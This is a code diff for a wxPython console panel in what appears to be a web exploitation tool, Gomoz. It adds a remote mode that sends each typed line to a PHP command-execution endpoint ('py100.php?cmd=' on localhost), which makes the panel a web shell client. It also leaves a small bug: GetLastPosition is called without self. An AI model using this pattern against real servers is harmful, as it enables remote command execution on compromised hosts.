@@ -1,10 +1,11 @@
 import wx
 import cmd
 import subprocess
-
+import re
+import Gomoz.cmd as cmd
 class GomozConsole(wx.Panel):
     #def __init__(self, panel, *args, **kwds):
-    def __init__(self, parent, id, title, prompt):
+    def __init__(self, parent, id, title, prompt, mode):
         wx.Panel.__init__(self, parent=parent)
         self.panel = parent
         if prompt != "" or prompt is not None:
@@ -12,6 +13,7 @@ class GomozConsole(wx.Panel):
         else:
             self.prompt = "user@gomoz:~ "
         self.textctrl = wx.TextCtrl(self.panel, -1, '', style=wx.TE_PROCESS_ENTER|wx.TE_MULTILINE)
+        self.mode = mode
         self.default_txt = self.textctrl.GetDefaultStyle()
         self.textctrl.AppendText(self.prompt)
         #self.textctrl.SetForegroundColour('white')
@@ -19,18 +21,25 @@ class GomozConsole(wx.Panel):
 
         self.__set_properties()
         self.__do_layout()
-        self.__bind_events()
+        self.__bind_events(self.mode)
+       
+    def __bind_events(self, mode):
+        if mode=='local':
+            self.textctrl.Bind(wx.EVT_TEXT_ENTER, self.__enter)
+        else:
+            self.textctrl.Bind(wx.EVT_TEXT_ENTER, self.__enter_cmd)
 
 
-    def __bind_events(self):
-        self.textctrl.Bind(wx.EVT_TEXT_ENTER, self.__enter)
+
+    def __enter_cmd(self, e):
+        self.value = (self.textctrl.GetValue())
+        self.eval_last_line("")
+        e.Skip()
 
 
     def __enter(self, e):
-        print 'enter'
         self.value = (self.textctrl.GetValue())
-        print (self.value)
-        self.eval_last_line()
+        self.eval_last_line('local')
         e.Skip()
 
 
@@ -43,15 +52,20 @@ class GomozConsole(wx.Panel):
         self.panel.SetSizer(sizer_1)
         self.Layout()
 
-    def eval_last_line(self):
+    def eval_last_line(self, mode):
         nl = self.textctrl.GetNumberOfLines()
         ln = self.textctrl.GetLineText(nl-1)
         ln = ln[len(self.prompt):]
         args = ln.split(" ")
-        print ln
-        proc = subprocess.Popen(args, stdout=subprocess.PIPE)
-        retvalue = proc.communicate()[0]
-      
+        if mode=='local':
+            proc = subprocess.Popen(args, stdout=subprocess.PIPE)
+            retvalue = proc.communicate()[0]
+        else:
+            url="http://localhost/temp/py100.php?cmd="
+            stat = cmd.exploiter("","","", url, ln)
+            retvalue = stat.GetData()
+            retvalue += '\n'
+            
         #c = wx.Colour(239, 177, 177)
         c = wx.Colour(0, 0, 0)
         tc = wx.TextAttr(c)
@@ -60,7 +74,8 @@ class GomozConsole(wx.Panel):
         self.textctrl.AppendText(retvalue)
         self.textctrl.SetDefaultStyle(self.default_txt)
         self.textctrl.AppendText(self.prompt)
-        #self.textctrl.SetInsertionPoint(GetLastPosition() - 1)
+        self.textctrl.SetInsertionPoint(GetLastPosition()-1)
+        #self.textctrl.SetInsertionPoint(0)
 
 
  
